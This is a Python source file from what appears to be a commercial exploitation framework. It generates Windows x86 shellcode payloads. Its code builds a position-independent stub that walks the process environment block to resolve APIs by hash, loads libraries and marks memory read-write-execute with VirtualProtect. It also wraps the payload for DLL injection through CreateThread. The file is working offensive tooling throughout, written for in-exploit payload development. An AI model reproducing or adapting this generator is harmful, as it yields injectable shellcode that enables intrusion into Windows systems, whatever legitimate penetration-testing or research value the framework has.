# a _more respectful__ windows payload generator
#
# these operate under the assumption that you will be using
# mosdef.assemble() in your exploit on the returned code ..
#
# NOTE: add whatever you want!

USAGE = """

This payload generator works on the concept of being a function
generator. Function calls made will be translated into a self.main
and a self.functions. Returned code then equals:

self.getpcloc + self.globals + self.functions + self.main

For example:

# get a code generator
codegen = basecode()
codegen.find_function('kernel32!loadlibrarya')
codegen.load_library('ws2_32.dll')
codegen.find_function('ws2_32!socket')
# you can print codegen.main to see the control flow at any point
# the default is to just chain function calls and save crucial
# return values into the GLOBALS section .. you could also replace
# codegen.main with your own custom control flow for the function
# calls .. thus providing a flexible framework .. to custom code
# something you just add stuff like so:

...
push args ...
call *SOCKET-getpcloc(%ebp)
...

See payloads.callback for an example on how to write payloads using
this generator.

So the idea is to have a python function call to assembly generator.
This makes clean and rapid payload development easier for in-exploit
usage, instead of trying to do massive all-in-one payloads in the
oldschool generator.

You can also replace the generated main with your own control flow
if you chose to, etc.

Written as a base logic for nico's new stuff -bas

for developers:

The naming convention for GLOBALS is 'NAME' (upper), so if you are
calling find_function('ws2_32.dll!socket') the resulting function
address will be in global 'SOCKET'. You can then call the resolved
function in the global via something like:

call *SOCKET-getpcloc(%ebp)

The purpose is to have something that allows you to write standalone
payloads that are not dependent on the old attribute system. Which is
a pain the rear when trying to do quick standalone in-exploit payload
development.

"""

import struct
import sys
if '.'  not in sys.path: 
    sys.path.append('.')

from exploitutils import *
import urllib

# helpers
def s_to_push(s, __endian__):
    """ string to dwords lulz """

    dword  = ''
    dwords = []

    for c in s:
        dword += c
        if len(dword) == 4:
            dwords.append(struct.unpack(__endian__+'L', dword)[0])
            dword = ''

    if dword != '':
        while len(dword) % 4:
            dword += '\x00'
        dwords.append(struct.unpack(__endian__+'L', dword)[0])

    dwords.reverse()
    return dwords

arch_f  = { 'x86' : ['pushl $0x%.8X // %s ', '<'] }

from MOSDEF.mosdefutils import *

class Globals:
    def __init__(self):
        self.data   = []
        self.names  = []

    # default can't be 0 .. for parsing semantics        
    def addDword(self, name, val = 0x41424344):
        if name not in self.names:
            self.data.append( ("_get_dword", name, val) )
            self.names.append(name) 
    
    def addUnicodeString(self, name, val):
        if name not in self.names:
            self.data.append( ("_get_urllib", name,  msunistring(val)) )
            self.names.append(name)

    def addString(self, name, val):
        if name not in self.names:
            self.data.append( ("_get_urllib_nul", name, val) )
            self.names.append(name)
        
    def _get_dword(self, name, val):
        return ["%s:\n" % name, 
                "    .long 0x%08x\n" % val]

    def _get_urllib_nul(self, name, val):
        return ["%s:\n" % name, 
                "    .urlencoded \"%s\"\n.byte 0x00\n" % urllib.quote(val)]

    def _get_urllib(self, name, val):
        return ["%s:\n" % name, 
                "    .urlencoded \"%s\"\n" % urllib.quote(val)]        
    
    def get(self):
        out = []
        for (fn, name, val) in self.data:
            out += self.__class__.__dict__[ fn ](self, name, val)
            
        return "".join(out)             
        
class basecode:
    def __init__(self, restorehash=False, VirtualProtect=False, dll=False, dll_return=True, dll_create_thread=True):
        self.functions      = ''
        self.main           = ''
        self._globals       = Globals()
        self.globals        = ''
        self.devmode        = True
        self._libraries     = []
        self._functions     = []
        self.RestartHash    = restorehash
        self.SaveHashes     = []
        self._callfunc      = []
        self.library_count  = 0
        self.callfunc_count = 0
        # code always starts with getpcloc

        self.getpcloc = """
        shellcodestart:
        """

        if dll:
            self.find_function('kernel32.dll!CreateThread')
            #
            # We have to wrap codegen.main into a CreateThread
            # call in order to meet DllMain semantics that require
            # the function to return.
            # 
            # In that way, we do not hijack the original thread that
            # was used to load/inject the DLL. This mostly comes into play
            # when using CANVAS inject_from_mem/injectdll modules.
            #
            if dll_create_thread:
                self.main += """
            jmp jump2
jump1:
            pop %ebx
            xorl %eax, %eax
            pushl %eax // lpThreadId
            pushl %eax // dwCreationFlags
            pushl %ebp // lpParameter
            pushl %ebx // lpStartAddress
            pushl %eax // dwStackSize
            pushl %eax // lpThreadAttributes
            call *CREATETHREAD-getpcloc(%ebp)
            ret
jump2:
            call jump1
            movl 4(%esp), %ebp // CreateThread lpParameter
            """
                
        
            # Entry point (DllMain) can get called multiple times during injection
            self.getpcloc += """
            movl $0x00000001, %eax
            // check the fwReason, if it's not PROCESS_ATTACH gracefully return TRUE
            cmpl 0x8(%esp), %eax
            jnz not_proc_attach
            pushad
            jmp findyou
not_proc_attach:	    
            ret
            """
        else:
            self.getpcloc += """
            jmp findyou
            """

        self.getpcloc += """
retpcloc:
            // save the pcloc as base pointer ..
            movl (%esp), %ebp
            ret
findyou:
            call retpcloc

getpcloc:
            // resolve all functions before entering main
        """
        
        if VirtualProtect:
            self.getpcloc += self.get_virtual_protect()
            
        if self.RestartHash:
            self.getpcloc += "call restorehash\n"
        
        self.getpcloc += """
        call resolve_functions
        """

        if dll:
            self.getpcloc += """
            call main
            popad
            xorl %eax, %eax
            RETURN_TRUE
            ret
            """.replace("RETURN_TRUE", "incl %eax" if dll_return else "")
        else:
            self.getpcloc += """
            jmp main
            """
        #set this to true when you want the shellcode loader
        #to work on Vista or >, but be bigger.
        self.vista_compat = False 

    def get_virtual_protect(self):
        dll_hash = self.get_hash("kernel32.dll")
        fun_hash = self.get_hash("VirtualProtect")
        
        code = """
        pushl $0x%08x
        pushl $0x%08x""" % (fun_hash, dll_hash)
        code+="""
        call  find_function
        movl  %ebp, %edx
        pushl %ecx
        movl  %esp, %ecx
        andl  $0xfffff000, %edx
        pushl %ecx
        pushl $0x40   // + rwx
        pushl $0x1000 // page size
        pushl %edx    // Our Page
        call  %eax    // kernel32.VirtualProtect
        popl  %ecx
        """
        devlog("basecode", "**VirtualProtect**")
        return code
        
    def get_hash(self, instr):
        """ dave's old function hashing routine """
        hash = 0
        for c in instr:
            d = ord(c)
            d = d | 0x60 # toupper
            hash += d
            hash = uint32(long(hash) << 1)
        #print "%s:0x%08x" % (instr, hash)
        return hash

    # note our find_function already finds the module base etc.
    # so we can pass it any module!function string and it'll find
    # it for us .. if you have to load a module first, then just
    # find_function('kernel32!loadlibrarya) and call loadlibrary
    # for the module, and then you can find_function again :>
    def find_function(self, dll_function):
        """ find a function given a dll!function string """
        dll = dll_function.split('!')[0]
        fun = dll_function.split('!')[1]

        if '.DLL' not in dll.upper():
            dll = dll + '.dll'

        dll_function_name = dll.lower() + "!" + fun.lower()

        if dll_function_name not in self._functions:
            self._functions.append(dll_function_name)
    
    def _set_functions(self):
        # Adding hashit and findfunction
        self.functions  = ""
        self.SaveHashes = []
        
        if 'hashit:' not in self.functions:
            self.functions += """
        hashit:
            pushl %ebp
            movl %esp,%ebp
            pushl %ecx
            pushl %ebx

            xorl %ebx,%ebx
            xorl %ecx,%ecx
            movl 0x8(%ebp),%eax

        hashloop:
            movb (%eax),%cl
            test %cl,%cl
            jz hashed
            orb $0x60,%cl
            addl %ecx,%ebx
            shl $1,%ebx
            addl 0x10(%ebp),%eax
            jmp hashloop

        hashed:
            .byte 0x91 //xchg %eax,%ecx
            cmpl 0xc(%ebp),%ebx
            jz donehash
            incl %eax

        donehash:
            popl %ebx
            popl %ecx
            movl %ebp,%esp
            popl %ebp

            ret $0xc

        find_function:
            pushl %ebp
            movl %esp,%ebp
            pushl %esi
            pushl %edi
            xor %ecx,%ecx
            movl %fs:0x30(%ecx),%eax
            movl 0xc(%eax),%eax
            movl 0xc(%eax),%ecx   

        nextinlist:
            movl (%ecx),%edx      // Pointer to next loaded DLL
            movl 0x30(%ecx),%eax  // Unicode string of the Loaded DLL
            pushl $0x2
            pushl 0x8(%ebp)
            pushl %eax
            call hashit          // hash the dll string and compare it with out hash
            test %eax,%eax
            jz foundmodule
            movl %edx,%ecx
            jmp nextinlist

        foundmodule:
            movl 0x18(%ecx),%edi   // edi will hold the dll base address
            movl 0x3c(%edi),%ebx   // MZ-> Offset to PE
            movl 0x78(%ebx,%edi,1),%ebx  // PE->0x78
            addl %edi,%ebx               // 
            movl 0x1c(%ebx),%ecx
            movl 0x20(%ebx),%edx
            movl 0x24(%ebx),%ebx
            addl %edi,%ecx
            addl %edi,%edx
            addl %edi,%ebx

        find_procedure:
            movl (%edx),%esi   
            addl %edi,%esi
            pushl $0x1
            pushl 0xc(%ebp)
            pushl %esi
            call hashit
            test %eax,%eax
            jz found_procedure
            add $4,%edx
            incl %ebx
            incl %ebx
            jmp find_procedure

        found_procedure:
            xor %edx,%edx
            mov (%ebx),%dx
            movl (%ecx,%edx,4),%eax
            addl %edi,%eax
            popl %edi
            popl %esi
            movl %ebp,%esp
            popl %ebp
            ret $0x8
        """

        last_dll_hash = 0
        dll_count = 0

        # remember to +4 the offset .. so our algo works properly
        self._globals.addDword('HASHES')

        # dedup_functions = []
        # for function in self._functions:
        #     dll = function.split('!')[0]
        #     fun = function.split('!')[1]

        #     if '.DLL' not in dll.upper():
        #         dll = dll + '.dll'
                
        #     name = dll + "!" + fun
            
        #     if name not in dedup_functions:
        #         dedup_functions.append(name)

        # self._functions = dedup_functions
        
        for dll_function in self._functions:
            # Prevent duplication of function hashes in our restore table,
            # which will end up causing corruption of the hash table itself.
            # if dll_function in already_defined:
            #    continue
               
            # already_defined.add(dll_function)
            
            dll = dll_function.split('!')[0]
            fun = dll_function.split('!')[1]

            if '.DLL' not in dll.upper():
                dll = dll + '.dll'

            dll_hash = self.get_hash(dll)
            fun_hash = self.get_hash(fun)

            # append the GLOBAL for the function
            if dll_hash != last_dll_hash:
                # add terminator for the previous dll table
                if dll_count:
                    self._globals.addDword('TERMDLL%X' % dll_count, 0)
                    if self.RestartHash:
                        self.SaveHashes.append( struct.pack("<L", 0) )
                # add new dll hash
                self._globals.addDword(dll.split('.')[0] + '%X' % dll_count, dll_hash)
                if self.RestartHash:
                    self.SaveHashes.append( struct.pack("<L", dll_hash) )
                dll_count += 1
                
            self._globals.addDword(fun.upper(), fun_hash)
            if self.RestartHash:
                self.SaveHashes.append( struct.pack("<L", fun_hash) )
            # find the function and put it in the GLOBAL
            last_dll_hash = dll_hash

        # add terminator for last dll set
        self._globals.addDword('TERMDLL%X' % dll_count, 0)

        if self.RestartHash:
            self._globals.addString( "RHASH", "".join(self.SaveHashes))
            self.functions += """
            restorehash:
            leal HASHES+4-getpcloc(%ebp),%edi
            leal RHASH - getpcloc(%ebp), %esi
            xorl %ecx, %ecx
            movb $HASHLEN, %cl
            .byte 0xf3 //rep movsd
            .byte 0xa5
            ret
            """.replace( "HASHLEN",  "0x%x" % len(self.SaveHashes) )
            
        if 'resolve_functions:' not in self.functions:
            self.functions += """
                    // format: dll : function : functionlabel : 0
                resolve_functions:
                    movl $DLLCOUNT,%edi
                    leal HASHES-getpcloc(%ebp),%esi
                    jmp init_dll

                next_dll:
                    popl %eax
                    decl %edi
                    LOADLIBRARYCODE
                    test %edi,%edi
                    jz done_with_functions

                init_dll:
                    // load any pre-needed modules here ...

                    incl %esi
                    incl %esi
                    incl %esi
                    incl %esi
                    movl (%esi),%eax  // dll hash
                    pushl %eax

                next_function:
                    incl %esi
                    incl %esi
                    incl %esi
                    incl %esi                                        
                    movl (%esi),%eax    // function hash
                    test %eax,%eax
                    jz next_dll

                do_find_function:
                    movl (%esp),%eax
                    // arg2 function hash
                    // arg1 dll hash
                    pushl (%esi)
                    pushl %eax
                    call find_function
                    // replace the hash with the function address :)
                    movl %eax,(%esi)
                    jmp next_function

                done_with_functions:
                    ret

                """.replace('DLLCOUNT', "%d" % dll_count)

        # load any modules needed for the function resolve ...
        load_code = ''
        for (module, words) in self._callfunc:
            load_code += self.get_call_function(module, words)
        for module in self._libraries:
            load_code += self.get_load_library_code(module)
            
        self.functions = self.functions.replace('LOADLIBRARYCODE', load_code) 
        return

    def load_library(self, module):
        self._libraries.append(module)

    def call_function(self, module, words):
        self._callfunc.append( (module, words) )
        
    def get_call_function(self, module, words):
        """ loadlibrarya's a module """
        # assumes kernel32!loadlibrarya was found
        # push the module to load
        
        fun = module.split("!")[1]
        fun_hash = self.get_hash( fun ) 
            
        if (fun_hash & 0xFFFF0000) == 0:
            cm = "mod_%s: cmpw $0x%x,%%ax" % ( fun ,fun_hash )
        else:
            cm = "cmpl $0x%08x, %%eax" % fun_hash
        
        # only do loads when loadlibrarya was resolved
        load_code = """
            // only load if loadlibrarya was inited (hash word)
            movl %s-getpcloc(%%ebp),%%eax
            %s
            je skip_call_func%X
            pushl %%esi
            movl %%esp, %%esi
        """ % ( fun.upper(), cm, self.callfunc_count )
                
        # push the string onto the stack
        for word in words:
            
            if type(word) == type(""):
                if (len(word) % 4):
                    load_code += """
                    xorl %%eax,%%eax
                    pushl %%eax
                    """
                ww = s_to_push( word , arch_f['x86'][1] )
                for w in ww:
                    load_code += arch_f['x86'][0]% (w, struct.pack(arch_f['x86'][1]+'L', w)) + '\n'
                load_code+= """
                movl  %%esp, %%ebx
                pushl %%ebx // pushing "%s"
                """ % word
            
            elif type(word) == type(1):
                load_code += arch_f['x86'][0] % (word, struct.pack(arch_f['x86'][1]+'L', word)) + '\n'
            
        load_code += """
            call *%s-getpcloc(%%ebp)
            movl %%esi, %%esp  // Restoring ESP
            popl %%esi
            skip_call_func%X:
        """ % ( fun.upper(), self.callfunc_count )
        
        self.callfunc_count += 1
        return load_code


    def get_load_library_code(self, module):
        """ loadlibrarya's a module """
        # assumes kernel32!loadlibrarya was found
        # push the module to load
        dwords = s_to_push(module, arch_f['x86'][1])
        # only do loads when loadlibrarya was resolved
        load_code = """
            // only load if loadlibrarya was inited (hash word)
            movl LOADLIBRARYA-getpcloc(%%ebp),%%eax
            cmpw $0x5786,%%ax
            je skip_load_library%X
            xorl %%eax,%%eax
            pushl %%eax
        """ % self.library_count
        # push the string onto the stack
        for dword in dwords:
            load_code += arch_f['x86'][0]% (dword, \
                      struct.pack(arch_f['x86'][1]+'L', dword)) + '\n'
        load_code += """
            movl %esp,%ebx
            pushl %ebx
            call *LOADLIBRARYA-getpcloc(%ebp)
        """
        # eat stack leak
        for dword in dwords:
            load_code += """
               popl %ebx
           """
        # eat final dword and place exit label
        load_code += """
           popl %%ebx 
        skip_load_library%X:
        """ % self.library_count
        self.library_count += 1
        return load_code

    def _set_globals(self):
        """ sets the globals section """
        self.globals = "globals:\n"
        self.globals += self._globals.get()
        return self.globals

        
    def get(self):
        """ constructs and returns the final payload """
        asm = ''
        # we put the globals and functions _before_ main
        # so we get negative call offsets .. this reduces
        # the amount of encoding we have to do

        # in this order, always ..
        self._set_functions() # sets our primary globals
        self._set_globals() # sets our secondary globals

        asm += self.getpcloc
        asm += '\n'
        asm += self.globals
        asm += '\n'
        asm += '// END OF GLOBALS\n'
        asm += self.functions 
        asm += '\n'
        asm += '// END OF FUNCTIONS\n'
        asm += 'main:\n' # entry point from pcloc
        asm += self.main
        asm += '\n'
        asm += 'codeend: // END OF MAIN\n'
        # XXX: if you get YACC EOF errors .. this means you
        # XXX: are missing labels ...
        
        return asm

    def enable_debug(self):
        """ add a debug stub """
        
        if 'debug:' not in self.functions:
            self.functions += """
            debug:
                int3
                ret
            """

